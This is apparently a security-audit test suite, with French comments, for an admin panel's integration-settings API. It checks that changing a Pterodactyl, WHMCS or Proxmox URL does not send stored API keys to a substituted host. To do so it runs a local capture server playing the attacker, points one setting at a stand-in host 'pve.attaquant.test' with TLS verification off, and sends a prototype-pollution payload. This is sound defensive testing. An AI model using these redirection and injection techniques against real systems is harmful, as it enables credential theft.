/**
 * AUDIT DE SÉCURITÉ — réglages d'intégration (core/settings-routes.ts).
 *
 * A-01 : PUT /api/settings/<ns> fusionne le corps avec les réglages enregistrés. Changer seulement `url` conserve
 * les secrets (clé API, jeton) : ils sont alors envoyés au nouvel hôte dès le premier appel (test de connexion,
 * tableau de bord). Une session détournée peut ainsi EXFILTRER les clés API, alors que le contrat promet qu'elles
 * « ne sortent jamais du serveur ». Le module mail applique déjà la bonne règle (mot de passe à ressaisir si
 * l'hôte change) ; les réglages WHMCS / Pterodactyl / Proxmox, non.
 *
 * Comportement sûr attendu : un changement d'origine de l'URL sans ressaisie des secrets est refusé (400) ou
 * efface les secrets enregistrés. Dans les deux cas, l'hôte nouvellement désigné ne reçoit jamais l'ancien secret.
 */
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import type { FastifyInstance } from 'fastify';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { Browser, buildTestApp, createTestAdmin, uniqueIp, useFakeClock, type TestAdmin } from './helpers.js';

const APP_KEY = 'ptla_AuditApplicationKey0123456789abcdefABCDEF';
const CLIENT_KEY = 'ptlc_AuditClientKey0123456789abcdefABCDEF01234';
const WHMCS_SECRET = 'audit-whmcs-secret-0123456789';
const PVE_SECRET = '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0';

interface Captured {
  url: string;
  authorization: string | undefined;
  body: string;
}

let app: FastifyInstance;
let admin: TestAdmin;
let browser: Browser;
let legit: Server;
let attacker: Server;
const received: Captured[] = [];

const listen = (server: Server): Promise<number> =>
  new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve((server.address() as AddressInfo).port)));

let legitUrl = '';
let attackerUrl = '';

beforeAll(async () => {
  useFakeClock();
  legit = createServer((_req, res) => res.writeHead(401).end('{}'));
  attacker = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => {
      received.push({ url: req.url ?? '', authorization: req.headers.authorization, body: Buffer.concat(chunks).toString('utf8') });
      res.writeHead(401, { 'content-type': 'application/json' }).end('{}');
    });
  });
  legitUrl = `http://127.0.0.1:${await listen(legit)}`;
  attackerUrl = `http://127.0.0.1:${await listen(attacker)}`;

  app = await buildTestApp();
  admin = await createTestAdmin('carol');
  browser = new Browser(app, uniqueIp());
  // La connexion ouvre d'elle-même une fenêtre de step-up de 5 minutes : aucune re-confirmation n'est demandée ici.
  await browser.login(admin);
});

afterAll(async () => {
  await app.close();
  await new Promise((resolve) => legit.close(resolve));
  await new Promise((resolve) => attacker.close(resolve));
});

interface View {
  secrets: Record<string, boolean>;
  values: Record<string, unknown>;
}

describe('A-01 — changer l’URL d’une intégration ne doit pas envoyer le secret enregistré au nouvel hôte', () => {
  it('Pterodactyl : les clés Application / Client ne partent pas vers l’hôte substitué', async () => {
    const saved = await browser.put<View>('/api/settings/pterodactyl', { url: legitUrl, applicationKey: APP_KEY, clientKey: CLIENT_KEY });
    expect(saved.status).toBe(200);

    received.length = 0;
    // L'attaquant (session détournée) ne connaît pas les clés : il ne change QUE l'URL.
    const changed = await browser.put<View>('/api/settings/pterodactyl', { url: attackerUrl });
    // Déclencheurs : aucun n'exige de step-up.
    await browser.post('/api/settings/pterodactyl/test');
    await browser.get('/api/pterodactyl/servers');

    const leaked = received.filter((r) => r.authorization?.includes(APP_KEY) || r.authorization?.includes(CLIENT_KEY));
    expect(leaked.map((r) => r.url), 'clés API reçues par l’hôte substitué').toEqual([]);
    if (changed.status === 200) expect(changed.body.data.secrets).toEqual({ applicationKey: false, clientKey: false });
    else expect(changed.status).toBe(400);
  });

  it('WHMCS : l’identifiant et le secret API ne partent pas vers l’hôte substitué', async () => {
    const saved = await browser.put<View>('/api/settings/whmcs', { url: legitUrl, identifier: 'audit-identifier-0123456789', secret: WHMCS_SECRET });
    expect(saved.status).toBe(200);

    received.length = 0;
    const changed = await browser.put<View>('/api/settings/whmcs', { url: attackerUrl });
    await browser.post('/api/settings/whmcs/test');
    await browser.get('/api/whmcs/clients');

    const leaked = received.filter((r) => r.body.includes(WHMCS_SECRET));
    expect(leaked.map((r) => r.url), 'secret WHMCS reçu par l’hôte substitué').toEqual([]);
    if (changed.status === 200) expect(changed.body.data.secrets.secret).toBe(false);
    else expect(changed.status).toBe(400);
  });

  it('Proxmox : changer l’URL (ou désactiver la vérification TLS) sans ressaisir le jeton est refusé ou efface le jeton', async () => {
    const saved = await browser.put<View>('/api/settings/proxmox', { url: 'https://pve.exemple.test:8006', tokenId: 'audit@pve!panel', tokenSecret: PVE_SECRET });
    expect(saved.status).toBe(200);
    expect(saved.body.data.secrets.tokenSecret).toBe(true);

    // Même requête : nouvel hôte ET vérification du certificat coupée — le jeton partirait vers n'importe quel serveur.
    const changed = await browser.put<View>('/api/settings/proxmox', { url: 'https://pve.attaquant.test:8006', verifyTls: false });
    if (changed.status === 200) expect(changed.body.data.secrets.tokenSecret).toBe(false);
    else expect(changed.status).toBe(400);
  });
});

describe('vérifié — réglages : points contrôlés', () => {
  it('aucun secret n’est renvoyé par GET / PUT, et les espaces internes (security, notifications.vapid) n’ont pas de route', async () => {
    await browser.put('/api/settings/pterodactyl', { url: legitUrl, applicationKey: APP_KEY, clientKey: CLIENT_KEY });
    for (const ns of ['pterodactyl', 'whmcs', 'proxmox', 'notifications']) {
      const view = await browser.get(`/api/settings/${ns}`);
      expect(view.status).toBe(200);
      const text = JSON.stringify(view.body);
      for (const secret of [APP_KEY, CLIENT_KEY, WHMCS_SECRET, PVE_SECRET]) expect(text).not.toContain(secret);
    }
    expect((await browser.get('/api/settings/security')).status).toBe(404);
    expect((await browser.get('/api/settings/notifications.vapid')).status).toBe(404);
  });

  it('pollution de prototype : « __proto__ » / « constructor » dans le corps n’altèrent ni Object.prototype ni les réglages', async () => {
    const raw = await app.inject({
      method: 'PUT',
      url: '/api/settings/pterodactyl',
      remoteAddress: browser.ip,
      headers: {
        'content-type': 'application/json',
        origin: 'https://panel.test',
        'x-csrf-token': browser.csrfToken ?? '',
        cookie: [...browser.cookies].map(([k, v]) => `${k}=${v}`).join('; '),
      },
      payload: '{"__proto__":{"polluted":"oui"},"constructor":{"prototype":{"polluted":"oui"}},"url":"' + legitUrl + '"}',
    });
    expect([200, 400]).toContain(raw.statusCode);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });
});
